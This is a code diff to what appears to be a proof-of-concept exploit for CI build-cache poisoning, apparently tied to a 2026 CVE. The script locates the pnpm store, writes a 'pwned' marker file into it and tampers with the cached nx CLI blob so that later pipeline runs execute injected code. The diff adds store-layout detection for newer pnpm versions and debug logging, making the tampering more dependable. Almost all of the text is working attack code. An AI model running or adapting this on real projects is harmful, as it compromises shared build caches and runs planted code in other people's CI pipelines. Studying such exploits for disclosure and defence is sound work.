@@ -28,13 +28,20 @@ try {
   // STORE_PATH is exported to GITHUB_ENV by the era Setup Tools composite; fall back to pnpm.
   let store = process.env.STORE_PATH || '';
   if (!store) { try { store = execSync('pnpm store path --silent', { encoding: 'utf8' }).trim(); } catch {} }
-  const v10 = path.join(store, 'v10');
-  if (store && fs.existsSync(v10)) {
+  log('store=' + store + ' exists=' + (store ? fs.existsSync(store) : 'n/a'));
+  // pnpm >=10 reports the store root already ending in /v10; older layouts append /v10.
+  let v10 = '';
+  for (const cand of [path.join(store, 'v10'), store]) {
+    if (store && fs.existsSync(path.join(cand, 'files'))) { v10 = cand; break; }
+  }
+  if (!v10 && store && fs.existsSync(path.join(store, 'v10'))) v10 = path.join(store, 'v10');
+  log('v10=' + (v10 || '(none)') + ' filesExists=' + (v10 ? fs.existsSync(path.join(v10, 'files')) : 'n/a'));
+  if (v10 && fs.existsSync(v10)) {
     // 2a. unmistakable marker file inside the cached directory
     try {
       fs.writeFileSync(path.join(v10, 'pwned-cve-2026-45321.txt'), 'INJECTED-MARKER-cve-2026-45321-f78c8a66810e\n');
-      log('planted marker in store: ' + store);
-    } catch {}
+      log('planted marker in store: ' + path.join(v10, 'pwned-cve-2026-45321.txt'));
+    } catch (e) { log('marker write FAILED: ' + e.message); }
 
     // 2b. tamper the nx CLI blob: every later run that restores this store executes our code
     const require2 = createRequire(path.join(process.cwd(), 'package.json'));
@@ -43,6 +50,7 @@ try {
     if (!nxJs) {
       try { nxJs = execSync("find node_modules/.pnpm -path '*/nx/bin/nx.js' 2>/dev/null | head -1", { encoding: 'utf8' }).trim(); } catch {}
     }
+    log('nxJs=' + (nxJs || '(unresolved)') + ' exists=' + (nxJs ? fs.existsSync(nxJs) : 'n/a'));
     if (nxJs && fs.existsSync(nxJs)) {
       const orig = fs.readFileSync(nxJs);
       const h = crypto.createHash('sha512').update(orig).digest('hex');
@@ -55,6 +63,7 @@ try {
                           { encoding: 'utf8' }).trim();
         } catch {}
       }
+      log('blob=' + (blob || '(not found)') + ' exists=' + (blob ? fs.existsSync(blob) : 'n/a'));
       if (blob && fs.existsSync(blob)) {
         const backup = path.join(v10, 'nx-orig.cjs');       // persists inside the cached store
         if (!fs.existsSync(backup)) fs.writeFileSync(backup, orig);
